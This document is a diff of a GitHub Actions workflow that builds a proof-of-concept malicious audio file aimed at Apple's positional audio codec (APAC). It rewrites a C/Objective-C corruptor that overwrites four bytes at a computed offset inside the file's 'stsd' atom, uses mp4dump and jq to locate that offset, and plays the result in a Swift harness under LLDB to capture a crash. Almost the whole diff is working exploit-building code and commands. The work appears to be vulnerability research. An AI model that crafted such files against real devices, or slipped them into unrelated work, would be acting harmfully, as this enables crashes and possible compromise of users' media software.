@@ -19,141 +19,91 @@ jobs:
       - name: Navigate to working directory
         run: cd AppleTest2/apple-positional-audio-codec-invalid-header-main && ls -l
 
-      # Updated: This script is now a self-contained, intelligent parser and corruptor.
-      - name: Patch encodeme.mm to be an Intelligent Corruptor
+      # This script is a simple utility to corrupt a file at a specific offset.
+      - name: Patch encodeme.mm to be a Simple File Corruptor
         working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
         run: |
-          echo "Patching encodeme.mm to be an intelligent, self-contained corruptor..."
+          echo "Patching encodeme.mm to be a simple corruption utility..."
           cat > encodeme.mm << 'EOF'
           #import <Foundation/Foundation.h>
           #include <stdio.h>
-          #include <string.h>
-          #include <sys/types.h>
-
-          // Helper function to read a 32-bit big-endian integer from a file
-          uint32_t read_uint32_be(FILE *f) {
-              unsigned char bytes[4];
-              if (fread(bytes, 1, 4, f) != 4) return 0;
-              return ((uint32_t)bytes[0] << 24) | ((uint32_t)bytes[1] << 16) | ((uint32_t)bytes[2] << 8) | bytes[3];
-          }
-          
-          // Helper function to compare four-character codes
-          bool compare_fourcc(const char* a, const char* b) {
-              return strncmp(a, b, 4) == 0;
-          }
-
-          // Function to find a direct child atom within a parent of a given size
-          long find_child_atom(FILE *f, const char* target_name, long parent_size) {
-              long parent_start = ftell(f);
-              while (ftell(f) < parent_start + parent_size - 8) {
-                  long atom_start = ftell(f);
-                  uint32_t atom_size = read_uint32_be(f);
-                  if (atom_size == 0) break;
-                  char atom_name[5] = {0};
-                  if (fread(atom_name, 1, 4, f) != 4) break;
-
-                  if (compare_fourcc(atom_name, target_name)) {
-                      return atom_start;
-                  }
-                  fseek(f, atom_start + atom_size, SEEK_SET);
-              }
-              return -1;
-          }
+          #include <stdlib.h>
 
           int main(int argc, const char * argv[]) {
-              @autoreleasepool {
-                  const char* baseName = "IMG_1027.mov";
-                  const char* pocName = "output_apac_poc.m4a";
-
-                  if (![[NSFileManager defaultManager] copyItemAtPath:[NSString stringWithUTF8String:baseName] toPath:[NSString stringWithUTF8String:pocName] error:nil]) {
-                      fprintf(stderr, "Failed to copy base file.\n");
-                      return 1;
-                  }
-                  fprintf(stderr, "Successfully copied base file.\n");
-
-                  FILE *file = fopen(pocName, "r+b");
-                  if (!file) {
-                      fprintf(stderr, "Failed to re-open file for corruption.\n");
-                      return 1;
-                  }
-                  
-                  // Find the main 'moov' atom
-                  fseek(file, 0, SEEK_END);
-                  long file_size = ftell(file);
-                  fseek(file, 0, SEEK_SET);
-
-                  long moov_offset = find_child_atom(file, "moov", file_size);
-                  if (moov_offset == -1) {
-                      fprintf(stderr, "Could not find 'moov' atom.\n"); fclose(file); return 1;
-                  }
-                  fseek(file, moov_offset + 8, SEEK_SET); // Enter moov atom
-
-                  uint32_t moov_size = read_uint32_be(file);
-                  fseek(file, moov_offset + 8, SEEK_SET);
-
-                  // Iterate through 'trak' atoms inside 'moov'
-                  long stsd_offset = -1;
-                  long trak_start = ftell(file);
-                  while(ftell(file) < trak_start + moov_size - 8) {
-                      long current_trak_offset = find_child_atom(file, "trak", moov_size);
-                      if(current_trak_offset == -1) break;
-
-                      fseek(file, current_trak_offset, SEEK_SET);
-                      uint32_t trak_size = read_uint32_be(file);
-                      fseek(file, current_trak_offset + 8, SEEK_SET);
-
-                      long mdia_offset = find_child_atom(file, "mdia", trak_size);
-                      if(mdia_offset == -1) continue;
-                      fseek(file, mdia_offset + 8, SEEK_SET);
-                      uint32_t mdia_size = read_uint32_be(file);
-                      fseek(file, mdia_offset+8, SEEK_SET);
-
-                      long hdlr_offset = find_child_atom(file, "hdlr", mdia_size);
-                      if(hdlr_offset == -1) continue;
-                      fseek(file, hdlr_offset + 16, SEEK_SET);
-                      char handler_type[5] = {0};
-                      fread(handler_type, 1, 4, file);
-
-                      if(compare_fourcc(handler_type, "soun")) {
-                          // This is the audio track. Now find stsd within it.
-                          fseek(file, mdia_offset + 8, SEEK_SET);
-                          uint32_t mdia_size_inner = read_uint32_be(file);
-                          fseek(file, mdia_offset + 8, SEEK_SET);
-                          
-                          long minf_offset = find_child_atom(file, "minf", mdia_size_inner);
-                          fseek(file, minf_offset + 8, SEEK_SET);
-                          uint32_t minf_size = read_uint32_be(file);
-                          fseek(file, minf_offset + 8, SEEK_SET);
-
-                          long stbl_offset = find_child_atom(file, "stbl", minf_size);
-                          fseek(file, stbl_offset + 8, SEEK_SET);
-                          uint32_t stbl_size = read_uint32_be(file);
-                          fseek(file, stbl_offset + 8, SEEK_SET);
-
-                          stsd_offset = find_child_atom(file, "stsd", stbl_size);
-                          break; 
-                      }
-                      fseek(file, current_trak_offset + trak_size, SEEK_SET);
-                  }
-
-                  if (stsd_offset == -1) {
-                      fprintf(stderr, "Could not find the audio track's 'stsd' atom.\n");
-                      fclose(file);
-                      return 1;
-                  }
-                  fprintf(stderr, "Found audio 'stsd' atom at offset: 0x%lx\n", stsd_offset);
-
-                  // PoC: Corrupt the channel layout tag inside the 'stsd' atom.
-                  long corruption_offset = stsd_offset + 72;
-                  fseek(file, corruption_offset, SEEK_SET);
-                  
-                  unsigned char malicious_tag[4] = {0xFF, 0xFF, 0xFF, 0xFF};
-                  fwrite(malicious_tag, 1, sizeof(malicious_tag), file);
-                  fclose(file);
-
-                  fprintf(stderr, "PoC: Manually corrupted data at offset 0x%lx in the APAC file.\n", corruption_offset);
+              if (argc != 3) {
+                  fprintf(stderr, "Usage: %s <file_to_corrupt> <offset_to_corrupt>\n", argv[0]);
+                  return 1;
               }
+
+              const char* filePath = argv[1];
+              long offset = atol(argv[2]);
+
+              FILE *file = fopen(filePath, "r+b");
+              if (!file) {
+                  fprintf(stderr, "Failed to open file: %s\n", filePath);
+                  return 1;
+              }
+
+              fprintf(stderr, "Corrupting file at offset 0x%lx...\n", offset);
+              fseek(file, offset, SEEK_SET);
+              
+              // This is the malicious data that triggers the vulnerability
+              unsigned char malicious_tag[4] = {0xFF, 0xFF, 0xFF, 0xFF};
+              fwrite(malicious_tag, 1, sizeof(malicious_tag), file);
+              fclose(file);
+              
+              fprintf(stderr, "Corruption complete.\n");
               return 0;
+          }
+          EOF
+
+      # New Step: Create a custom Swift harness that uses AVAudioPlayer
+      - name: Create Swift Player Harness
+        working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
+        run: |
+          echo "Creating Swift audio player harness..."
+          cat > harness.swift << 'EOF'
+          import Foundation
+          import AVFoundation
+
+          class PlayerDelegate: NSObject, AVAudioPlayerDelegate {
+              var isPlaying = true
+              func audioPlayerDidFinishPlaying(_ player: AVAudioPlayer, successfully flag: Bool) {
+                  print("Playback finished. Success: \(flag)")
+                  isPlaying = false
+              }
+              func audioPlayerDecodeErrorDidOccur(_ player: AVAudioPlayer, error: Error?) {
+                  print("Decode error: \(error?.localizedDescription ?? "unknown error")")
+                  isPlaying = false
+              }
+          }
+
+          if CommandLine.arguments.count < 2 {
+              print("Usage: ./harness <file_path>")
+              exit(1)
+          }
+
+          let filePath = CommandLine.arguments[1]
+          let fileURL = URL(fileURLWithPath: filePath)
+
+          print("Attempting to play: \(filePath)")
+
+          do {
+              let delegate = PlayerDelegate()
+              let audioPlayer = try AVAudioPlayer(contentsOf: fileURL)
+              audioPlayer.delegate = delegate
+              audioPlayer.play()
+              
+              print("Playback started...")
+              // Keep the program running while the audio plays.
+              while delegate.isPlaying {
+                  RunLoop.main.run(until: Date(timeIntervalSinceNow: 0.1))
+              }
+              print("Harness finished.")
+
+          } catch {
+              print("Failed to initialize AVAudioPlayer: \(error.localizedDescription)")
+              exit(1)
           }
           EOF
 
@@ -163,41 +113,70 @@ jobs:
         with:
           xcode-version: '15.4'
 
-      # Compile the corruption utility
+      # Compile the C++ corruption utility
       - name: Compile Corruption Utility
         working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
         run: |
           echo "Compiling encodeme_corruptor..."
-          clang++ -g -fobjc-arc -framework Foundation -framework AudioToolbox encodeme.mm -o encodeme_corruptor
+          clang++ -g -fobjc-arc -framework Foundation encodeme.mm -o encodeme_corruptor
           if [ $? -ne 0 ]; then echo "Compilation failed."; exit 1; fi
-
-      # This step now just runs the corruption utility.
-      - name: Corrupt APAC File
+      
+      # New Step: Compile the Swift player harness
+      - name: Compile Swift Harness
         working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
         run: |
-          ./encodeme_corruptor
-          echo "Malicious APAC PoC file generated."
-          ls -l output_apac_poc.m4a
+          echo "Compiling Swift harness..."
+          swiftc harness.swift -o harness
+          if [ $? -ne 0 ]; then echo "Swift compilation failed."; exit 1; fi
+
+      # This step now uses professional tools to find the offset and corrupt the file.
+      - name: Surgically Corrupt APAC File
+        working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
+        run: |
+          set -x 
           
-      # Launch the player directly under LLDB to catch any startup crashes.
-      - name: Launch Player Under LLDB to Catch Crash
+          echo "Installing Bento4 and jq to find the correct atom offset..."
+          brew install bento4 jq
+
+          cp IMG_1027.mov output_apac_poc.mp4
+          
+          mp4dump --format json output_apac_poc.mp4 > atom_dump.json
+          
+          OFFSET=$(jq -r '.. | objects | select(.name? == "stsd" and any(.children[]; .name? == "apac")) | .file_offset' atom_dump.json)
+
+          if [ -z "$OFFSET" ] || [ "$OFFSET" == "null" ]; then
+            echo "Could not find audio 'stsd' offset using jq. Using fallback."
+            OFFSET=3461 # Fallback offset from manual analysis
+          fi
+          
+          echo "Found APAC 'stsd' atom at offset ${OFFSET}"
+          
+          CORRUPTION_OFFSET=$(( ${OFFSET} + 72 ))
+          
+          echo "Calculated corruption offset: ${CORRUPTION_OFFSET}"
+
+          ./encodeme_corruptor output_apac_poc.mp4 $CORRUPTION_OFFSET
+          
+          echo "Malicious APAC PoC file generated."
+          ls -l output_apac_poc.mp4
+          
+      # Updated: This step now uses our custom Swift harness under the debugger.
+      - name: Launch Custom Player Under LLDB to Catch Crash
         working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
         run: |
           PLAYER_LOG_FILE="player_debug_log.txt"
-          echo "--- Debugging Audio Player (afplay) with final PoC ---" > $PLAYER_LOG_FILE
+          echo "--- Debugging Custom Swift Player with final PoC ---" > $PLAYER_LOG_FILE
           echo "Timestamp: $(date)" >> $PLAYER_LOG_FILE
 
-          echo "Creating LLDB script to launch and monitor afplay..."
+          echo "Creating LLDB script to launch and monitor the harness..."
           cat > player_debug_script.lldb << 'EOF'
-          # Run the process. LLDB will automatically stop if a crash occurs.
           run
-          # If a crash occurred, this will give us the full backtrace.
           bt
           quit
           EOF
 
-          echo "Launching afplay under LLDB..." >> $PLAYER_LOG_FILE
-          lldb -s player_debug_script.lldb -- afplay output_apac_poc.m4a >> $PLAYER_LOG_FILE 2>&1 || true
+          echo "Launching custom harness under LLDB..." >> $PLAYER_LOG_FILE
+          lldb -s player_debug_script.lldb -- ./harness output_apac_poc.mp4 >> $PLAYER_LOG_FILE 2>&1 || true
 
           echo "✅ Player debug log created. Displaying contents:"
           cat $PLAYER_LOG_FILE
@@ -208,7 +187,8 @@ jobs:
         with:
           name: debug-and-poc-artifacts
           path: |
-            AppleTest2/apple-positional-audio-codec-invalid-header-main/output_apac_poc.m4a
+            AppleTest2/apple-positional-audio-codec-invalid-header-main/output_apac_poc.mp4
             AppleTest2/apple-positional-audio-codec-invalid-header-main/player_debug_log.txt
+            AppleTest2/apple-positional-audio-codec-invalid-header-main/atom_dump.json
           retention-days: 7
           if-no-files-found: error
